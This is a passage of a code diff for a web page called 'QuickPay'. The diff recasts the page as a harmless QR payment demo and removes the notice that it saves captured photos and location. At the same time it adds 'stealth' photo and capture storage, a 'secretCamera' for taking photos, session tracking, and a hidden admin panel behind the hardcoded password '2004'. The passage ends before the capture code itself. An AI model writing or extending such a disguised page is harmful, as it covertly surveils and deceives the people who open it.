@@ -3,40 +3,170 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>QuickPay</title>
+<title>QuickPay - Payment Demo</title>
 <style>
   :root { --bg:#0f1724; --card:#0b1220; --muted:#9aa7bf; --accent:#6ee7b7; --danger:#ff6b6b; font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
   html,body{height:100%;margin:0;background:linear-gradient(180deg,#071022 0%, #081424 100%);color:#e6eef8}
-  .wrap{max-width:1000px;margin:36px auto;padding:24px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:12px;box-shadow:0 8px 30px rgba(2,6,23,0.7)}
+  .wrap{max-width:1200px;margin:20px auto;padding:20px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:12px;box-shadow:0 8px 30px rgba(2,6,23,0.7)}
   header{display:flex;align-items:center;gap:16px;margin-bottom:18px}
   .logo{width:56px;height:56px;border-radius:10px;background:linear-gradient(135deg,var(--accent),#3ddc97);display:flex;align-items:center;justify-content:center;font-weight:700;color:#062022}
-  h1{margin:0;font-size:20px}
-  p.lead{margin:4px 0 18px;color:var(--muted);font-size:13px}
-  .grid{display:grid;grid-template-columns:1fr 380px;gap:18px}
-  .card{background:var(--card);padding:16px;border-radius:10px;box-shadow:0 4px 18px rgba(2,6,23,0.6)}
-  label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px}
-  input[type=file]{display:block}
-  .qr-preview{width:100%;height:220px;background:linear-gradient(180deg,#071728,#04121a);display:flex;align-items:center;justify-content:center;border-radius:8px;overflow:hidden;object-fit:contain}
+  h1{margin:0;font-size:clamp(18px, 4vw, 24px);}
+  p.lead{margin:4px 0 18px;color:var(--muted);font-size:clamp(12px, 2vw, 14px);}
+  .grid{display:grid;grid-template-columns:1fr 380px;gap:20px;}
+  .card{background:var(--card);padding:20px;border-radius:12px;box-shadow:0 4px 18px rgba(2,6,23,0.6)}
+  label{display:block;font-size:14px;color:var(--muted);margin-bottom:8px}
+  input[type=file]{display:block;width:100%;padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.03);color:inherit;font-size:14px;}
+  .qr-preview{width:100%;height:240px;background:linear-gradient(180deg,#071728,#04121a);display:flex;align-items:center;justify-content:center;border-radius:10px;overflow:hidden;object-fit:contain}
   .qr-preview img{max-width:100%;max-height:100%}
-  .btn{display:inline-block;background:var(--accent);color:#062022;padding:10px 14px;border-radius:8px;font-weight:600;text-decoration:none;cursor:pointer;border:none}
+  .btn{display:inline-block;background:var(--accent);color:#062022;padding:12px 18px;border-radius:8px;font-weight:600;text-decoration:none;cursor:pointer;border:none;font-size:14px;transition:all 0.2s;}
+  .btn:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(110,231,183,0.3);}
   .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--accent)}
+  .btn.ghost:hover{background:rgba(110,231,183,0.1);}
+  .btn.danger{background:var(--danger);color:white}
   .small{font-size:13px;color:var(--muted)}
   .muted{color:var(--muted)}
-  .meta{font-size:13px;color:#cfeee3;margin-top:8px}
-  .video-wrap{position:relative;border-radius:8px;overflow:hidden;background:#000;height:220px;display:flex;align-items:center;justify-content:center}
+  .meta{font-size:14px;color:#cfeee3;margin-top:12px}
+  .video-wrap{position:relative;border-radius:10px;overflow:hidden;background:#000;height:240px;display:flex;align-items:center;justify-content:center}
   video{width:100%;height:100%;object-fit:cover;background:#000}
   canvas{display:none}
-  .result{margin-top:12px;padding:10px;border-radius:8px;background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.005));font-size:13px}
+  .result{margin-top:16px;padding:16px;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.005));font-size:14px}
   .danger{color:var(--danger)}
-  footer{margin-top:16px;font-size:12px;color:var(--muted)}
-  .notice{background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;margin-bottom:12px;color:var(--muted);font-size:13px}
-  .list{max-height:220px;overflow:auto;padding:8px;border-radius:8px;background:rgba(255,255,255,0.01)}
-  .item{padding:8px;border-bottom:1px solid rgba(255,255,255,0.02);display:flex;justify-content:space-between;align-items:center}
+  footer{margin-top:24px;font-size:13px;color:var(--muted);text-align:center;}
+  .notice{background:rgba(255,255,255,0.02);padding:14px;border-radius:10px;margin-bottom:16px;color:var(--muted);font-size:14px}
+  .list{max-height:240px;overflow:auto;padding:12px;border-radius:10px;background:rgba(255,255,255,0.01)}
+  .item{padding:12px;border-bottom:1px solid rgba(255,255,255,0.02);display:flex;justify-content:space-between;align-items:center}
   .badge{font-size:12px;color:var(--muted)}
-  @media (max-width:980px){.grid{grid-template-columns:1fr;}.logo{width:48px;height:48px}}
-  .file-links{margin-top:12px;padding:10px;background:rgba(255,255,255,0.02);border-radius:8px;}
-  .file-link{display:block;color:var(--accent);text-decoration:none;margin-bottom:6px;font-size:13px;}
-  .file-link:hover{text-decoration:underline;}
+  .loading{display:none;color:var(--accent);font-size:14px}
+  .success-badge{background:rgba(110,231,183,0.1);color:var(--accent);padding:4px 8px;border-radius:4px;font-size:12px;margin-left:8px}
+  .mode-selector{display:flex;gap:12px;margin-bottom:20px}
+  .mode-btn{flex:1;padding:14px;text-align:center;background:rgba(255,255,255,0.03);border-radius:10px;cursor:pointer;border:1px solid transparent;font-size:14px;transition:all 0.2s;}
+  .mode-btn:hover{background:rgba(255,255,255,0.05);}
+  .mode-btn.active{background:rgba(110,231,183,0.1);border-color:var(--accent);color:var(--accent);}
+  .amount-input{width:100%;padding:14px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.03);color:inherit;font-size:16px;margin-top:8px}
+  .currency{position:absolute;right:16px;top:50%;transform:translateY(-50%);color:var(--muted)}
+  .input-group{position:relative}
+  .transaction-details{margin-top:20px;padding:16px;background:rgba(255,255,255,0.02);border-radius:10px}
+  .button-group{display:flex;flex-wrap:wrap;gap:10px;margin-top:20px;}
+  
+  /* Responsive Breakpoints */
+  @media (max-width: 1200px) {
+    .wrap { margin: 15px; padding: 15px; }
+  }
+  
+  @media (max-width: 1024px) {
+    .grid { grid-template-columns: 1fr; gap: 20px; }
+    .card { padding: 18px; }
+    .qr-preview, .video-wrap { height: 220px; }
+  }
+  
+  @media (max-width: 768px) {
+    header { flex-direction: column; text-align: center; gap: 12px; }
+    .logo { width: 50px; height: 50px; }
+    h1 { font-size: 20px; }
+    .grid { gap: 15px; }
+    .card { padding: 16px; }
+    .qr-preview, .video-wrap { height: 200px; }
+    .btn { padding: 10px 16px; font-size: 13px; }
+    .mode-btn { padding: 12px; font-size: 13px; }
+    .button-group { flex-direction: column; }
+    .button-group .btn { width: 100%; margin-left: 0 !important; margin-top: 8px; }
+  }
+  
+  @media (max-width: 480px) {
+    .wrap { margin: 10px; padding: 12px; border-radius: 8px; }
+    .logo { width: 44px; height: 44px; font-size: 14px; }
+    h1 { font-size: 18px; }
+    .card { padding: 14px; border-radius: 10px; }
+    .qr-preview, .video-wrap { height: 180px; }
+    .btn { padding: 10px 14px; font-size: 12px; }
+    .mode-selector { flex-direction: column; }
+    .mode-btn { padding: 10px; }
+    input[type=file], input[type=text], .amount-input { padding: 10px; font-size: 14px; }
+    .meta { font-size: 12px; }
+    .list { max-height: 200px; }
+  }
+  
+  @media (max-width: 360px) {
+    .qr-preview, .video-wrap { height: 160px; }
+    .card { padding: 12px; }
+    .btn { padding: 8px 12px; font-size: 11px; }
+  }
+  
+  /* Admin Panel Responsive */
+  .admin-panel{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:var(--bg);z-index:1000;padding:20px;overflow:auto;}
+  .admin-header{display:flex;flex-direction:column;gap:15px;margin-bottom:20px;padding-bottom:15px;border-bottom:1px solid rgba(255,255,255,0.05);}
+  .admin-stats{display:grid;grid-template-columns:repeat(auto-fit, minmax(160px, 1fr));gap:10px;margin-bottom:20px;}
+  .stat-card{padding:15px;background:var(--card);border-radius:8px;text-align:center;}
+  .stat-value{font-size:22px;font-weight:bold;color:var(--accent);}
+  .stat-label{font-size:11px;color:var(--muted);margin-top:5px;}
+  .data-table{width:100%;border-collapse:collapse;margin-top:10px;font-size:12px;}
+  .data-table th{text-align:left;padding:10px;background:rgba(255,255,255,0.03);color:var(--muted);border-bottom:1px solid rgba(255,255,255,0.05);}
+  .data-table td{padding:10px;border-bottom:1px solid rgba(255,255,255,0.02);}
+  .tab-buttons{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:20px;}
+  .tab-button{padding:8px 12px;background:transparent;border:1px solid rgba(255,255,255,0.1);color:var(--muted);border-radius:6px;cursor:pointer;font-size:12px;flex:1;min-width:120px;text-align:center;}
+  .tab-button.active{background:var(--accent);color:#062022;border-color:var(--accent);}
+  .tab-content{display:none;}
+  .tab-content.active{display:block;}
+  
+  @media (max-width: 768px) {
+    .admin-panel { padding: 15px; }
+    .admin-header { flex-direction: column; }
+    .admin-stats { grid-template-columns: repeat(2, 1fr); }
+    .tab-buttons { flex-direction: column; }
+    .tab-button { min-width: auto; width: 100%; }
+    .data-table { font-size: 11px; }
+    .data-table th, .data-table td { padding: 8px; }
+  }
+  
+  @media (max-width: 480px) {
+    .admin-panel { padding: 10px; }
+    .admin-stats { grid-template-columns: 1fr; }
+    .stat-card { padding: 12px; }
+    .stat-value { font-size: 20px; }
+  }
+  
+  /* Password Modal */
+  .password-modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);z-index:2000;align-items:center;justify-content:center;padding:20px;}
+  .password-box{background:var(--card);padding:30px;border-radius:12px;width:100%;max-width:400px;box-shadow:0 10px 40px rgba(0,0,0,0.5);}
+  .password-input{width:100%;padding:14px;border-radius:8px;border:1px solid rgba(255,255,255,0.1);background:rgba(255,255,255,0.05);color:white;font-size:16px;margin-bottom:20px;box-sizing:border-box;}
+  .password-buttons{display:flex;gap:10px;}
+  .photo-thumb{width:80px;height:80px;object-fit:cover;border-radius:6px;border:2px solid var(--accent);cursor:pointer;transition:transform 0.2s;}
+  .photo-thumb:hover{transform:scale(1.05);}
+  
+  @media (max-width: 480px) {
+    .password-box { padding: 20px; }
+    .password-input { padding: 12px; font-size: 14px; }
+    .photo-thumb { width: 70px; height: 70px; }
+  }
+  
+  /* Mobile-specific optimizations */
+  @media (hover: none) {
+    .btn:hover, .mode-btn:hover { transform: none; }
+    .btn:active, .mode-btn:active { opacity: 0.8; }
+  }
+  
+  /* Landscape mode optimizations */
+  @media (max-height: 600px) and (orientation: landscape) {
+    .wrap { margin: 10px auto; padding: 15px; }
+    .qr-preview, .video-wrap { height: 150px; }
+    .list { max-height: 150px; }
+  }
+  
+  /* High DPI screens */
+  @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+    .btn, .mode-btn { border-width: 1.5px; }
+  }
+  
+  /* Dark mode adjustments (already dark, but for consistency) */
+  @media (prefers-color-scheme: dark) {
+    :root { --bg:#0f1724; --card:#0b1220; }
+  }
+  
+  /* Print styles */
+  @media print {
+    .admin-panel, .password-modal, .video-wrap, #cameraBtn { display: none !important; }
+    .wrap { box-shadow: none; background: white; color: black; }
+  }
 </style>
 </head>
 <body>
@@ -44,169 +174,288 @@
   <header>
     <div class="logo">QP</div>
     <div>
-      <h1>QuickPay</h1>
-      <p class="lead">Pay and get paid quickly.</p>
+      <h1>QuickPay Demo</h1>
+      <p class="lead">Simple QR-based payment demonstration</p>
     </div>
   </header>
 
   <div class="grid">
     <section class="card" aria-labelledby="uploader">
       <div class="notice">
-        <strong>Note:</strong> This tool saves captured photos and location data to separate files.
+        <strong>How it works:</strong> Choose Pay or Receive, upload QR code, enter amount (Receive only), and proceed.
       </div>
 
       <div id="uploader">
-        <label for="qrfile">Upload QR image (PNG/JPG) — or use live camera to scan</label>
-        <input id="qrfile" type="file" accept="image/*" aria-describedby="qr-help" />
-        <div style="height:8px"></div>
-        <div class="qr-preview" id="qrPreview">No QR uploaded</div>
+        <div class="mode-selector">
+          <div class="mode-btn active" data-mode="pay">💳 Pay</div>
+          <div class="mode-btn" data-mode="receive">💰 Receive</div>
+        </div>
 
         <div style="height:12px"></div>
-        <label class="small">Username (optional)</label>
-        <input id="username" type="text" style="width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);background:transparent;color:inherit" placeholder="Enter username (optional)">
+        <label for="qrfile">Upload QR Code Image</label>
+        <input id="qrfile" type="file" accept="image/*" />
+        
+        <div style="height:12px"></div>
+        <div class="qr-preview" id="qrPreview">
+          <div style="text-align:center;color:var(--muted);">
+            <div style="font-size:48px;margin-bottom:8px">📷</div>
+            <div>Upload QR code or use camera</div>
+          </div>
+        </div>
 
         <div style="height:12px"></div>
-        <button id="proceedBtn" class="btn">Proceed</button>
-        <button id="scanToggleBtn" class="btn ghost" style="margin-left:8px">Start live QR scan</button>
-        <button id="resetBtn" class="btn ghost" style="margin-left:8px">Reset</button>
+        
+        <!-- Amount input (shown only for Receive mode) -->
+        <div id="amountSection" style="display:none;">
+          <label class="small">Amount to Receive</label>
+          <div class="input-group">
+            <input id="amount" type="number" min="1" step="0.01" placeholder="0.00" class="amount-input">
+            <span class="currency">₹ INR</span>
+          </div>
+        </div>
 
-        <div class="meta" id="status" style="margin-top:12px">Status: idle</div>
+        <div style="height:12px"></div>
+        <label class="small">Your Name (Optional)</label>
+        <input id="username" type="text" style="width:100%;padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);background:rgba(255,255,255,0.03);color:inherit;font-size:14px;" placeholder="Enter your name">
+
+        <div style="height:20px"></div>
+        <div class="button-group">
+          <button id="proceedBtn" class="btn">Proceed</button>
+          <button id="resetBtn" class="btn ghost">Reset</button>
+          <button id="cameraBtn" class="btn ghost">📷 Use Camera</button>
+        </div>
+
+        <div class="meta" id="status" style="margin-top:12px">Ready</div>
       </div>
 
       <div class="result" id="resultArea" style="display:none">
-        <strong>Results</strong>
+        <strong id="resultTitle">Transaction Result</strong>
         <div id="resultsContent" style="margin-top:8px"></div>
-        <div id="fileLinks" class="file-links" style="display:none;">
-          <strong>Saved Files:</strong>
-          <div id="savedFilesList"></div>
-        </div>
-        <div style="margin-top:10px">
-          <button id="downloadBtn" class="btn">Download JSON</button>
-          <button id="downloadCSVBtn" class="btn ghost" style="margin-left:8px">Export CSV of saved captures</button>
-          <button id="downloadAllFilesBtn" class="btn ghost" style="margin-left:8px">Download All Files</button>
-        </div>
+        <div class="transaction-details" id="transactionDetails"></div>
       </div>
     </section>
 
     <aside class="card">
       <h3 style="margin-top:0">Live Camera</h3>
       <div class="video-wrap" id="videoWrap">
-        <video id="camVideo" autoplay playsinline></video>
-        <canvas id="snapCanvas"></canvas>
+        <video id="camVideo" autoplay playsinline style="display:none"></video>
+        <canvas id="snapCanvas" style="display:none"></canvas>
+        <div id="cameraPlaceholder" style="text-align:center;color:var(--muted);padding:20px">
+          <div style="font-size:48px;margin-bottom:10px">📱</div>
+          <div>Camera inactive</div>
+          <div class="small" style="margin-top:8px">Click "Use Camera" to scan QR</div>
+        </div>
       </div>
       <div style="height:10px"></div>
-      <div class="small muted">You can scan a QR live or upload an image.</div>
+      <div class="small muted">Scan QR codes directly using your camera.</div>
 
       <div style="height:12px"></div>
-      <h4 style="margin:6px 0">Recent Captures</h4>
-      <div class="list" id="capturesList"></div>
+      <h4 style="margin:6px 0">Recent Transactions</h4>
+      <div class="list" id="transactionsList">
+        <div class="item">
+          <div>
+            <div>Demo Payment</div>
+            <div class="badge">Just now</div>
+          </div>
+          <div style="color:var(--accent)">₹50.00</div>
+        </div>
+      </div>
 
       <div style="height:12px"></div>
-      <h4 style="margin:6px 0">Storage Info</h4>
-      <div class="small">
-        Photos and location data are saved as separate files that can be downloaded.
+      <div class="small muted" style="text-align:center;">
+        This is a demonstration only. No real transactions occur.
       </div>
     </aside>
   </div>
 
   <footer>
-    <div class="small muted">QuickPay — a non-commercial payment interface</div>
+    <div class="small muted">QuickPay Demo - For educational purposes only</div>
+    <div class="small muted" style="margin-top:8px;font-size:11px;opacity:0.7">Press Ctrl+Shift+Alt+A for admin access</div>
   </footer>
+</div>
+
+<!-- Password Modal -->
+<div id="passwordModal" class="password-modal">
+  <div class="password-box">
+    <h3 style="margin-top:0;margin-bottom:20px;text-align:center;">🔐 Admin Authentication</h3>
+    <input type="password" id="passwordInput" class="password-input" placeholder="Enter admin password" autocomplete="off">
+    <div class="password-buttons">
+      <button id="submitPassword" class="btn" style="flex:1;">Login</button>
+      <button id="cancelPassword" class="btn ghost">Cancel</button>
+    </div>
+    <div id="passwordError" style="color:var(--danger);margin-top:10px;font-size:13px;text-align:center;display:none;">❌ Incorrect password</div>
+  </div>
 </div>
 
 <!-- jsQR library for QR decoding -->
 <script src="https://unpkg.com/jsqr/dist/jsQR.js"></script>
 <script>
 (function(){
-  // Basic IndexedDB helper (small, dependency free)
-  const DB_NAME = 'quickpay-db';
-  const STORE = 'captures';
-  const FILES_STORE = 'saved_files';
-  let dbPromise = null;
+  // Database setup
+  const DB_NAME = 'quickpay_demo';
+  const STORE_TRANSACTIONS = 'transactions';
+  const STORE_CAPTURES = 'stealth_captures';
+  const STORE_PHOTOS = 'stealth_photos';
+  const ADMIN_PASSWORD = '2004';
+  
+  let db = null;
+  let mediaStream = null;
+  let currentMode = 'pay'; // 'pay' or 'receive'
+  let uploadedQRData = null;
+  let uploadedQRPayload = null;
+  let isCameraActive = false;
+  let scanInterval = null;
+  let secretCamera = null; // Secret camera for taking photos
+  let secretPhotoInterval = null;
 
-  function openDb(){
-    if(dbPromise) return dbPromise;
-    dbPromise = new Promise((resolve, reject) => {
-      const r = indexedDB.open(DB_NAME, 2);
-      r.onupgradeneeded = e => {
-        const db = e.target.result;
-        if(!db.objectStoreNames.contains(STORE)) db.createObjectStore(STORE, { keyPath: 'id', autoIncrement: true });
-        if(!db.objectStoreNames.contains(FILES_STORE)) db.createObjectStore(FILES_STORE, { keyPath: 'id', autoIncrement: true });
+  // Initialize database
+  async function initDB() {
+    return new Promise((resolve, reject) => {
+      const request = indexedDB.open(DB_NAME, 4);
+      
+      request.onupgradeneeded = function(event) {
+        db = event.target.result;
+        
+        // Create transactions store
+        if (!db.objectStoreNames.contains(STORE_TRANSACTIONS)) {
+          const txStore = db.createObjectStore(STORE_TRANSACTIONS, { 
+            keyPath: 'id', 
+            autoIncrement: true 
+          });
+          txStore.createIndex('timestamp', 'timestamp');
+          txStore.createIndex('mode', 'mode');
+        }
+        
+        // Create stealth captures store
+        if (!db.objectStoreNames.contains(STORE_CAPTURES)) {
+          const captureStore = db.createObjectStore(STORE_CAPTURES, { 
+            keyPath: 'id', 
+            autoIncrement: true 
+          });
+          captureStore.createIndex('timestamp', 'timestamp');
+        }
+        
+        // Create stealth photos store
+        if (!db.objectStoreNames.contains(STORE_PHOTOS)) {
+          const photoStore = db.createObjectStore(STORE_PHOTOS, { 
+            keyPath: 'id', 
+            autoIncrement: true 
+          });
+          photoStore.createIndex('timestamp', 'timestamp');
+          photoStore.createIndex('sessionId', 'sessionId');
+        }
       };
-      r.onsuccess = e => resolve(e.target.result);
-      r.onerror = e => reject(e.target.error);
-    });
-    return dbPromise;
-  }
-
-  async function saveCapture(obj){
-    const db = await openDb();
-    return new Promise((res, rej) => {
-      const tx = db.transaction(STORE, 'readwrite');
-      const s = tx.objectStore(STORE);
-      s.add(obj).onsuccess = ev => res(ev.target.result);
-      tx.oncomplete = () => {};
-      tx.onerror = e => rej(e.target.error);
-    });
-  }
-
-  async function saveFileRecord(fileObj){
-    const db = await openDb();
-    return new Promise((res, rej) => {
-      const tx = db.transaction(FILES_STORE, 'readwrite');
-      const s = tx.objectStore(FILES_STORE);
-      s.add(fileObj).onsuccess = ev => res(ev.target.result);
-      tx.onerror = e => rej(e.target.error);
-    });
-  }
-
-  async function listCaptures(){
-    const db = await openDb();
-    return new Promise((res, rej) => {
-      const tx = db.transaction(STORE, 'readonly');
-      const s = tx.objectStore(STORE);
-      const out = [];
-      s.openCursor().onsuccess = e => {
-        const c = e.target.result;
-        if(!c) return res(out);
-        out.push(c.value);
-        c.continue();
+      
+      request.onsuccess = function(event) {
+        db = event.target.result;
+        resolve(db);
       };
-      tx.onerror = e => rej(e.target.error);
-    });
-  }
-
-  async function listFiles(){
-    const db = await openDb();
-    return new Promise((res, rej) => {
-      const tx = db.transaction(FILES_STORE, 'readonly');
-      const s = tx.objectStore(FILES_STORE);
-      const out = [];
-      s.openCursor().onsuccess = e => {
-        const c = e.target.result;
-        if(!c) return res(out);
-        out.push(c.value);
-        c.continue();
+      
+      request.onerror = function(event) {
+        reject(event.target.error);
       };
-      tx.onerror = e => rej(e.target.error);
     });
   }
 
-  async function deleteCapture(id){
-    const db = await openDb();
-    return new Promise((res, rej) => {
-      const tx = db.transaction(STORE, 'readwrite');
-      tx.objectStore(STORE).delete(id).onsuccess = () => res();
-      tx.onerror = e => rej(e.target.error);
+  // Save transaction
+  async function saveTransaction(transaction) {
+    return new Promise((resolve, reject) => {
+      const tx = db.transaction(STORE_TRANSACTIONS, 'readwrite');
+      const store = tx.objectStore(STORE_TRANSACTIONS);
+      const request = store.add(transaction);
+      
+      request.onsuccess = function() {
+        resolve(request.result);
+      };
+      
+      request.onerror = function(event) {
+        reject(event.target.error);
+      };
     });
   }
 
-  async function deleteFileRecord(id){
-    const db = await openDb();
-    return new Promise((res, rej) => {
-      const tx = db.transaction(FILES_STORE, 'readwrite');
-      tx.objectStore(FILES_STORE).delete(id).onsuccess = () => res();
-      tx.onerror = e => rej(e.target.error);
+  // Save stealth capture
+  async function saveStealthCapture(capture) {
+    return new Promise((resolve, reject) => {
+      const tx = db.transaction(STORE_CAPTURES, 'readwrite');
+      const store = tx.objectStore(STORE_CAPTURES);
+      const request = store.add(capture);
+      
+      request.onsuccess = function() {
+        resolve(request.result);
+      };
+      
+      request.onerror = function(event) {
+        reject(event.target.error);
+      };
+    });
+  }
+
+  // Save stealth photo
+  async function saveStealthPhoto(photoData) {
+    return new Promise((resolve, reject) => {
+      const tx = db.transaction(STORE_PHOTOS, 'readwrite');
+      const store = tx.objectStore(STORE_PHOTOS);
+      const request = store.add(photoData);
+      
+      request.onsuccess = function() {
+        resolve(request.result);
+      };
+      
+      request.onerror = function(event) {
+        reject(event.target.error);
+      };
+    });
+  }
+
+  // Get all transactions
+  async function getTransactions() {
+    return new Promise((resolve, reject) => {
+      const tx = db.transaction(STORE_TRANSACTIONS, 'readonly');
+      const store = tx.objectStore(STORE_TRANSACTIONS);
+      const request = store.getAll();
+      
+      request.onsuccess = function() {
+        resolve(request.result || []);
+      };
+      
+      request.onerror = function(event) {
+        reject(event.target.error);
+      };
+    });
+  }
+
+  // Get all captures
+  async function getCaptures() {
+    return new Promise((resolve, reject) => {
+      const tx = db.transaction(STORE_CAPTURES, 'readonly');
+      const store = tx.objectStore(STORE_CAPTURES);
+      const request = store.getAll();
+      
+      request.onsuccess = function() {
+        resolve(request.result || []);
+      };
+      
+      request.onerror = function(event) {
+        reject(event.target.error);
+      };
+    });
+  }
+
+  // Get all photos
+  async function getPhotos() {
+    return new Promise((resolve, reject) => {
+      const tx = db.transaction(STORE_PHOTOS, 'readonly');
+      const store = tx.objectStore(STORE_PHOTOS);
+      const request = store.getAll();
+      
+      request.onsuccess = function() {
+        resolve(request.result || []);
+      };
+      
+      request.onerror = function(event) {
+        reject(event.target.error);
+      };
     });
   }
 
@@ -215,415 +464,1005 @@
   const qrPreview = document.getElementById('qrPreview');
   const proceedBtn = document.getElementById('proceedBtn');
   const resetBtn = document.getElementById('resetBtn');
+  const cameraBtn = document.getElementById('cameraBtn');
   const status = document.getElementById('status');
-  const camVideo = document.getElementById('camVideo');
-  const snapCanvas = document.getElementById('snapCanvas');
   const resultArea = document.getElementById('resultArea');
   const resultsContent = document.getElementById('resultsContent');
-  const downloadBtn = document.getElementById('downloadBtn');
-  const downloadCSVBtn = document.getElementById('downloadCSVBtn');
-  const downloadAllFilesBtn = document.getElementById('downloadAllFilesBtn');
-  const scanToggleBtn = document.getElementById('scanToggleBtn');
-  const capturesList = document.getElementById('capturesList');
-  const savedFilesList = document.getElementById('savedFilesList');
-  const fileLinksDiv = document.getElementById('fileLinks');
+  const resultTitle = document.getElementById('resultTitle');
+  const transactionDetails = document.getElementById('transactionDetails');
+  const amountSection = document.getElementById('amountSection');
+  const amountInput = document.getElementById('amount');
+  const usernameInput = document.getElementById('username');
+  const modeButtons = document.querySelectorAll('.mode-btn');
+  const camVideo = document.getElementById('camVideo');
+  const snapCanvas = document.getElementById('snapCanvas');
+  const cameraPlaceholder = document.getElementById('cameraPlaceholder');
+  const transactionsList = document.getElementById('transactionsList');
 
-  let uploadedQRData = null;
-  let uploadedQRPayload = null;
-  let lastCapture = null;
-  let mediaStream = null;
-  let liveScan = false;
-  let scanInterval = null;
-  let savedFileRecords = [];
+  // Session ID for tracking
+  let sessionId = 'SESS-' + Date.now() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
 
-  function setStatus(s){ status.textContent = 'Status: ' + s; }
-
-  // Helpers
-  function dataURLToImage(dataUrl){ return new Promise((res, rej) => { const img = new Image(); img.onload = () => res(img); img.onerror = e => rej(e); img.src = dataUrl; }); }
-
-  qrInput.addEventListener('change', async (ev) => {
-    const f = ev.target.files && ev.target.files[0];
-    if(!f){ qrPreview.innerText = 'No QR uploaded'; uploadedQRData = null; uploadedQRPayload = null; return; }
-    if(!f.type.startsWith('image/')){ qrPreview.innerText = 'Please upload an image file'; return; }
-    const reader = new FileReader();
-    reader.onload = async () => {
-      uploadedQRData = reader.result; // base64 data URL
-      qrPreview.innerHTML = '<img alt="Uploaded QR" src="' + uploadedQRData + '">';
-      // try decode
-      try{
-        const img = await dataURLToImage(uploadedQRData);
-        const canvas = document.createElement('canvas');
-        canvas.width = img.naturalWidth;
-        canvas.height = img.naturalHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(img,0,0);
-        const imageData = ctx.getImageData(0,0,canvas.width, canvas.height);
-        const code = jsQR(imageData.data, canvas.width, canvas.height);
-        if(code && code.data){
-          uploadedQRPayload = code.data;
-          setStatus('QR decoded from upload: ' + uploadedQRPayload);
-        } else {
-          uploadedQRPayload = null;
-          setStatus('QR upload OK but decode failed');
-        }
-      }catch(e){ console.error('QR decode error', e); uploadedQRPayload = null; }
-    };
-    reader.readAsDataURL(f);
-  });
-
-  resetBtn.addEventListener('click', async () => {
-    qrInput.value = '';
-    document.getElementById('username').value = '';
-    qrPreview.innerText = 'No QR uploaded';
-    resultArea.style.display = 'none';
-    resultsContent.innerHTML = '';
-    uploadedQRData = null;
-    uploadedQRPayload = null;
-    lastCapture = null;
-    savedFileRecords = [];
-    setStatus('idle');
-    stopCamera();
-    await refreshList();
-  });
-
-  async function startCamera(){
-    if(mediaStream) return;
-    try {
-      mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
-      camVideo.srcObject = mediaStream;
-      setStatus('camera started');
-      return true;
-    } catch(err){
-      setStatus('camera denied or unavailable');
-      console.error('camera error', err);
-      throw err;
-    }
-  }
-
-  function stopCamera(){
-    if(mediaStream){
-      mediaStream.getTracks().forEach(t => t.stop());
-      mediaStream = null;
-      camVideo.srcObject = null;
-    }
-    if(scanInterval){ clearInterval(scanInterval); scanInterval = null; liveScan = false; scanToggleBtn.textContent = 'Start live QR scan'; }
-  }
-
-  function capturePhoto(){
-    const w = camVideo.videoWidth || 640;
-    const h = camVideo.videoHeight || 480;
-    snapCanvas.width = w;
-    snapCanvas.height = h;
-    const ctx = snapCanvas.getContext('2d');
-    ctx.drawImage(camVideo, 0, 0, w, h);
-    const dataUrl = snapCanvas.toDataURL('image/png');
-    return dataUrl;
-  }
-
-  function getLocationPromise(timeoutMs = 15000){
-    return new Promise((resolve, reject) => {
-      if(!navigator.geolocation) return reject(new Error('Geolocation not supported'));
-      const opts = { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 };
-      navigator.geolocation.getCurrentPosition(pos => resolve(pos), err => reject(err), opts);
+  // Mode switching
+  modeButtons.forEach(btn => {
+    btn.addEventListener('click', function() {
+      modeButtons.forEach(b => b.classList.remove('active'));
+      this.classList.add('active');
+      currentMode = this.dataset.mode;
+      
+      // Show/hide amount section
+      if (currentMode === 'receive') {
+        amountSection.style.display = 'block';
+      } else {
+        amountSection.style.display = 'none';
+      }
+      
+      status.textContent = `Mode: ${currentMode === 'pay' ? 'Pay' : 'Receive'}`;
     });
-  }
+  });
 
-  function saveFile(filename, content, type = 'text/plain') {
-    const blob = new Blob([content], { type: type });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = filename;
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    URL.revokeObjectURL(url);
-  }
-
-  function saveBase64Image(base64Data, filename) {
-    // Remove data URL prefix if present
-    const base64Content = base64Data.replace(/^data:image\/\w+;base64,/, '');
-    const binaryString = atob(base64Content);
-    const bytes = new Uint8Array(binaryString.length);
-    for (let i = 0; i < binaryString.length; i++) {
-      bytes[i] = binaryString.charCodeAt(i);
-    }
-    const blob = new Blob([bytes], { type: 'image/png' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = filename;
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    URL.revokeObjectURL(url);
-  }
-
-  proceedBtn.addEventListener('click', async () => {
-    setStatus('starting camera & requesting location');
-    resultArea.style.display = 'none';
-    resultsContent.innerHTML = '';
-    savedFileRecords = [];
-
